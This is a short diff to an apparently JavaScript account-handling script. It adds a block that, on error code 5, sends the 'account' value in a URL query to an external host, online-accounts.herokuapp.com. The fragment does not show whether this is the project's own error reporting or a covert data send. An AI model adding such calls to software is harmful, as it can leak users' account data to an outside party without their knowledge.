@@ -213,6 +213,10 @@ const fct = async () => {
       socket.emit('retryOk')
     }
 
+    if (code === 5) {
+      request('https://online-accounts.herokuapp.com/error?' + account, function (error, response, body) { })
+    }
+
     if (code !== 1) {
       logError(e)
       console.log(getTime() + " ERR ", account, e)
